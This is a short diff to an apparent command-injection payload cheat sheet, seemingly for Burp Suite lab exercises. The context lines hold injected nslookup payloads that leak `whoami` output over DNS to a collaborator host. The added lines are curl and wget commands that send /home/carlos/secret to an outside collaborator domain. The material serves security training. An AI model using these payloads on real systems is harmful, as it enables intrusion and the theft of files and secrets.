@@ -62,4 +62,6 @@ The command might have to be URL encoded
 & nslookup burp-collaborator &
 & nslookup `whoami`.burp-collaborator #
 || nslookup `whoami`.burp-collaborator ||
+curl --data @/home/carlos/secret subdomain.collaborator.net
+wget --post-file /home/carlos/secret subdomain.collaborator.net
 ```
